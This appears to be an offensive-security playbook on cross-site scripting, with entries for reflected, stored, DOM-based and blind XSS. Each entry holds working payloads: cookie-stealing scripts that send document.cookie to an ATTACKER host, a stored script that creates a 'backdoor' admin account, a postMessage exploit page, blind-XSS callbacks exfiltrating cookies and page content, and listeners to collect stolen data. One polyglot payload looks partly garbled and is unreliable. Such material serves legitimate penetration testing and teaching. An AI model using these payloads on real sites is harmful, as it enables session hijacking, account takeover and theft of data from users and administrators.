# Web – Cross-Site Scripting (XSS)

### Reflected XSS via URL Parameter [added: 2026-04]
- **Tags:** #XSS #ReflectedXSS #Polyglot #EventHandler #OWASPA7 #BurpSuite #dalfox #InputValidation
- **Trigger:** User input from URL query parameters is reflected directly in the HTML response without encoding (visible in View Source or Burp response)
- **Prereq:** A parameter whose value is reflected in the HTML body or attribute context + no WAF or bypassable WAF + browser-accessible endpoint
- **Yields:** Session hijacking via cookie theft, phishing overlay, keylogging, or redirect to attacker-controlled site; proves impact for reflected XSS finding
- **Opsec:** Low
- **Context:** During parameter fuzzing you notice a search query, error message, or redirect parameter echoes your input verbatim. Test with a polyglot payload that covers multiple injection contexts (tag, attribute, JavaScript string). If a WAF blocks `<script>`, pivot to event handlers or SVG tags. Use dalfox for automated context-aware payload selection.
- **Payload/Method:**
```bash
# Step 1: Identify reflection — check if raw input comes back in response
curl -s "http://target/search?q=xsstestcanary" | grep -i "xsstestcanary"

# Step 2: Polyglot payload covering tag/attribute/JS contexts
# Manually test in browser or via curl:
PAYLOAD='jaVasCript:/*-/*`/*\`/*'"'"'/*"/**/(/* */oNcliCk=alert() )//%%0telerik%%0AconfirmEx//&PAYLOAD=oNmouseover=alert()//<svgslash/telerik/telerikonload=alert()//>'
curl -s "http://target/search?q=${PAYLOAD}" | grep -i "oncli\|onmouse\|onload"

# Step 3: Common event-handler bypasses when <script> is blocked
# Attribute context:
" onfocus=alert(document.cookie) autofocus="
# Tag injection context:
<img src=x onerror=alert(document.cookie)>
<svg/onload=alert(document.cookie)>
<details open ontoggle=alert(document.cookie)>

# Step 4: Automated scanning with dalfox
dalfox url "http://target/search?q=FUZZ" --blind "https://your-xsshunter.xss.ht"

# Step 5: Cookie theft payload (after confirming execution)
<img src=x onerror="fetch('https://ATTACKER/steal?c='+document.cookie)">
```

### Stored XSS via User Input Field [added: 2026-04]
- **Tags:** #XSS #StoredXSS #PersistentXSS #AdminPanel #OWASPA7 #AccountTakeover #PrivilegeEscalation #SessionHijacking
- **Trigger:** Application stores user-submitted content (profile fields, comments, forum posts, ticket descriptions) and renders it to other users — especially admins reviewing submissions
- **Prereq:** A field that stores input and renders it back to other users without output encoding + the ability to create/submit content (registered user or public form)
- **Yields:** Persistent code execution in victim browsers — steal admin session tokens, create backdoor admin accounts, exfiltrate sensitive page content, pivot from low-priv user to admin
- **Opsec:** Med
- **Context:** You have a low-privilege account and notice that profile bios, comments, or support tickets are rendered in an admin dashboard or other user-facing pages. Stored XSS here fires every time the page loads, making it far more impactful than reflected. Target admin panels where your stored content will be rendered with the admin's session context.
- **Payload/Method:**
```bash
# Step 1: Identify stored reflection — submit canary, check if it renders on other pages
curl -X POST "http://target/api/profile" \
  -H "Cookie: session=YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"bio": "xss_canary_12345"}'
# Visit admin panel or other user view and search for canary in source

# Step 2: Store a payload that steals the viewer's session
curl -X POST "http://target/api/comments" \
  -H "Cookie: session=YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"body": "<img src=x onerror=\"var i=new Image();i.src='\''https://ATTACKER:8443/steal?c='\''+document.cookie;\">"}'

# Step 3: If angle brackets are filtered but attribute context is injectable
curl -X POST "http://target/api/profile" \
  -H "Cookie: session=YOUR_TOKEN" \
  -d 'displayname="><img src=x onerror=fetch("https://ATTACKER/c?d="%2bdocument.cookie)>'

# Step 4: Admin account creation payload (fires when admin views the page)
<script>
fetch('/admin/users/create', {
  method: 'POST',
  headers: {'Content-Type':'application/json'},
  body: JSON.stringify({username:'backdoor', password:'Pwned123!', role:'admin'})
});
</script>

# Step 5: Listener to catch stolen cookies
python3 -m http.server 8443  # or use interactsh / Burp Collaborator
```

### DOM-Based XSS via document.location / innerHTML [added: 2026-04]
- **Tags:** #XSS #DOMXSS #ClientSide #innerHTML #documentLocation #hashFragment #JavaScriptSink #OWASPA7 #SourceAndSink
- **Trigger:** JavaScript on the page reads from a user-controllable source (location.hash, location.search, document.referrer, window.name, postMessage) and writes it to a dangerous sink (innerHTML, document.write, eval, setTimeout with string arg) without sanitization
- **Prereq:** Client-side JavaScript that uses a tainted source flowing into a DOM manipulation sink + ability to craft a URL or trigger the source input (no server-side reflection needed)
- **Yields:** Code execution in the victim's browser context — same impact as reflected XSS but entirely client-side, meaning it bypasses server-side WAFs and leaves no trace in server logs
- **Opsec:** Low
- **Context:** During JavaScript review (manually or with tools like LinkFinder/DOM Invader) you find code paths like `document.getElementById('x').innerHTML = location.hash.slice(1)`. Since the payload never hits the server, server-side WAFs are irrelevant. This is commonly found in SPAs, single-page dashboards, and apps that parse URL fragments for client-side routing.
- **Payload/Method:**
```bash
# Step 1: Identify sources and sinks in JavaScript
# Use Burp DOM Invader (built into Burp's Chromium browser) — it auto-taints sources
# Or manually grep downloaded JS files:
curl -s http://target/app.js | grep -iE "innerHTML|outerHTML|document\.write|\.html\(|eval\(|setTimeout\(|location\.(hash|search|href)|document\.referrer"

# Step 2: Common DOM XSS via location.hash
# If code does: element.innerHTML = decodeURIComponent(location.hash.slice(1))
# Payload URL:
http://target/page#<img src=x onerror=alert(document.cookie)>

# Step 3: DOM XSS via document.write with location.search
# If code does: document.write('<h1>' + new URLSearchParams(location.search).get('title') + '</h1>')
http://target/page?title=</h1><script>alert(document.cookie)</script>

# Step 4: DOM XSS via jQuery .html() sink
# If code does: $('#output').html(userInput)
# Same payloads as innerHTML

# Step 5: postMessage-based DOM XSS
# If code does: window.addEventListener('message', (e) => { div.innerHTML = e.data })
# Attacker page (host on your server):
cat > exploit.html << 'EXPLOIT'
<iframe src="http://target/vulnerable-page" id="f"></iframe>
<script>
  document.getElementById('f').onload = function() {
    this.contentWindow.postMessage('<img src=x onerror=alert(document.cookie)>', '*');
  };
</script>
EXPLOIT

# Step 6: Automated DOM XSS discovery
# Use LinkFinder to extract JS endpoints, then review each:
python3 linkfinder.py -i http://target -d -o cli | grep -i "\.js$"
```

### Blind XSS via Contact Form / Ticket System [added: 2026-04]
- **Tags:** #XSS #BlindXSS #XSSHunter #StoredXSS #AdminPanel #OutOfBand #OOB #OWASPA7 #CallbackPayload #SupportTicket
- **Trigger:** Application has a contact form, support ticket system, feedback form, or any input field where the submitted data will be reviewed by an internal user (admin, support staff) in a back-end panel you cannot access
- **Prereq:** An input field that stores data rendered later in an admin/internal panel + an external callback server (XSS Hunter, Burp Collaborator, interactsh, or self-hosted) to detect blind execution
- **Yields:** Proof of XSS execution in internal/admin context — captured screenshots, cookies, DOM content, and URL of the internal page; potential for admin session hijack without ever seeing the admin panel
- **Opsec:** Med
- **Context:** You find a contact form or ticket system but cannot see where the data is rendered. Classic blind XSS scenario: inject a callback payload and wait for it to fire when an admin views the submission. Use XSS Hunter for a full-featured hosted solution or interactsh for lightweight OOB detection. Always spray blind XSS payloads into every text field you encounter during a pentest — User-Agent, Referer, profile fields, and form inputs.
- **Payload/Method:**
```bash
# Step 1: Set up your callback listener
# Option A — XSS Hunter (hosted): sign up at xsshunter.com, get your payload URL
# Option B — interactsh (self-hosted OOB):
interactsh-client -v  # note your unique subdomain: abc123.oast.fun

# Option C — Simple Python listener:
python3 -c "
from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl, sys
class H(SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f'[+] HIT: {self.path}'); self.send_response(200); self.end_headers()
HTTPServer(('0.0.0.0', 8443), H).serve_forever()
"

# Step 2: Blind XSS payload — fires callback with page data
PAYLOAD='"><script src=https://YOUR_XSSHUNTER.xss.ht></script>'

# Step 3: Inject into every available field
# Contact form:
curl -X POST "http://target/contact" \
  -d "name=${PAYLOAD}&email=test@test.com&subject=Question&message=${PAYLOAD}"

# Support ticket:
curl -X POST "http://target/api/tickets" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=TOKEN" \
  -d "{\"title\":\"${PAYLOAD}\",\"body\":\"${PAYLOAD}\",\"priority\":\"high\"}"

# Step 4: Spray into HTTP headers (some admin panels render these)
curl "http://target/" \
  -H "User-Agent: ${PAYLOAD}" \
  -H "Referer: ${PAYLOAD}" \
  -H "X-Forwarded-For: ${PAYLOAD}"

# Step 5: Self-contained payload without external script dependency
SELFCONTAINED='"><img src=x onerror="var x=new XMLHttpRequest();x.open(\"GET\",\"https://ATTACKER:8443/blind?cookie=\"+document.cookie+\"&url=\"+encodeURIComponent(document.URL)+\"&dom=\"+encodeURIComponent(document.body.innerHTML.slice(0,500)));x.send();">'

# Step 6: Polyglot for various contexts (attribute, tag, JS string)
POLYGLOT="--></script><script>fetch('https://ATTACKER:8443/xss?d='+document.cookie)</script><img src=x onerror=fetch('https://ATTACKER:8443/xss2?d='+document.cookie) '"
```
